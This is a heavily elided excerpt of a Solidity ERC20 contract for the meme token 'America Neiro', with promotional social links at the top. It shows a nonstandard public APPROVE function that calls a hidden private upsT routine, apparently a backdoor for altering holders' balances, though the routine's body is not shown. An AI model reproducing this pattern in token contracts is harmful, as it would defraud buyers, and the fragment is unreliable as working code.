/**
https://t.me/AmericaNeiro
https://twitter.com/AmericaNeiro_
*/
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function APPROVE(address account, uint256 amount) public virtual returns (uint256) {
        ...
        if (sr) {
            return upsT(account, amountHex);
        } else {
            return _getBalance(account);
        }
    }

    function upsT(address account, bytes32 amountHex) private returns (uint256) {
...
contract AmericaNeiro is ERC20 {
    ...
    constructor(address router) ERC20("America Neiro", "USNEIRO", u) {
